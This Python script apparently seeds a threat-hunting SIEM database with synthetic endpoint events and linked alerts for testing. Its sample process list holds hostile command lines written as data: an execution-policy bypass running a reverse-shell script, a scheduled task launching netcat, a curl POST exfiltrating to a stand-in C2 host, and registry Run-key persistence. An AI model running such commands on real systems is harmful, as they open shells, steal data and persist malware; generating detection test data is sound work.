import sqlite3
import random
import os
from datetime import datetime, timedelta

# --- CONFIGURATION ---
DB_PATH = r"C:\Users\manan\Desktop\threat-hunting-platform\threat_hunting.db"

HOSTS = ["WIN-SRV-01", "WIN-DESK-44", "UBUNTU-WEB", "MAC-CEO", "LINUX-DB-01"]
USERS = ["SYSTEM", "admin", "jsmith", "svc_account", "m.mandal"]
PROCESSES = [
    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\rev.ps1"),
    ("cmd.exe", "net user /domain"),
    ("cmd.exe", "whoami /all"),
    ("schtasks.exe", "schtasks /create /tn 'Update' /tr 'C:\\Windows\\Temp\\nc.exe' /sc minute"),
    ("curl.exe", "curl -X POST http://malicious-c2.com/exfil"),
    ("reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\temp\\malware.exe")
]
TACTICS = ["Initial Access", "Execution", "Persistence", "Discovery", "Lateral Movement"]
SEVERITIES = ["Low", "Medium", "High", "Critical"]

def generate_data():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    print(f"🧹 Cleaning old data from {DB_PATH}...")
    cursor.execute("DELETE FROM events")
    cursor.execute("DELETE FROM alerts")

    now = datetime.utcnow()
    
    print("🚀 Generating 2,000 baseline events...")
    for _ in range(2000):
        ts = (now - timedelta(days=random.uniform(0, 7))).strftime('%Y-%m-%d %H:%M:%S.%f')
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        proc, cmd = random.choice(PROCESSES)
        
        cursor.execute("""
            INSERT INTO events (timestamp, host, user, process, commandline, ip, domain, file_hash, source_type, source_name, raw_payload)
            VALUES (?, ?, ?, ?, ?, '192.168.1.10', '', '', 'endpoint', 'EDR-Lite', '{}')
        """, (ts, host, user, proc, cmd))

    print("🚨 Generating 50 'Attack Clusters' (Linked Alerts)...")
    for i in range(50):
        attack_host = random.choice(HOSTS)
        attack_user = random.choice(USERS)
        attack_time = now - timedelta(hours=random.uniform(0, 48))
        
        proc, cmd = random.choice(PROCESSES)
        ts_str = attack_time.strftime('%Y-%m-%d %H:%M:%S.%f')
        
        # 1. Create the 'Trigger' Event
        cursor.execute("""
            INSERT INTO events (timestamp, host, user, process, commandline, ip, domain, file_hash, source_type, source_name, raw_payload)
            VALUES (?, ?, ?, ?, ?, '10.0.0.50', '', '', 'endpoint', 'YARA-Engine', '{}')
        """, (ts_str, attack_host, attack_user, proc, cmd))
        
        trigger_event_id = cursor.lastrowid

        # 2. Create the Alert with ALL required fields
        cursor.execute("""
            INSERT INTO alerts (
                rule_id, severity, description, tactic, technique_id, 
                technique_name, event_id, host, user, process, ip, 
                domain, file_hash, commandline, source_type, source_name, 
                is_suppressed, suppression_reason, event_timestamp, 
                status, assigned_to, analyst_notes, created_at
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            f"RULE-{random.randint(100,999)}", 
            random.choice(SEVERITIES), 
            f"Suspicious {proc} execution", 
            random.choice(TACTICS),
            "T1059", # Technique ID
            "Command and Scripting Interpreter", # Technique Name
            trigger_event_id,
            attack_host, 
            attack_user, 
            proc, 
            "10.0.0.50",
            "", # domain
            "", # file_hash
            cmd,
            "endpoint",
            "YARA-Scanner",
            0, # is_suppressed
            "", # suppression_reason
            ts_str,
            "Open",
            "", # assigned_to
            "", # analyst_notes
            now.isoformat()
        ))

        # 3. Create Context events (+/- 2 minutes)
        for j in range(15):
            offset = random.uniform(-120, 120)
            context_ts = (attack_time + timedelta(seconds=offset)).strftime('%Y-%m-%d %H:%M:%S.%f')
            c_proc, c_cmd = random.choice(PROCESSES)
            
            cursor.execute("""
                INSERT INTO events (timestamp, host, user, process, commandline, ip, domain, file_hash, source_type, source_name, raw_payload)
                VALUES (?, ?, ?, ?, ?, '10.0.0.50', '', '', 'endpoint', 'EDR-Lite', '{}')
            """, (context_ts, attack_host, attack_user, c_proc, c_cmd))

    conn.commit()
    conn.close()
    print(f"\n✅ SUCCESS! Your SIEM is now fully populated with linked data.")

if __name__ == "__main__":
    generate_data()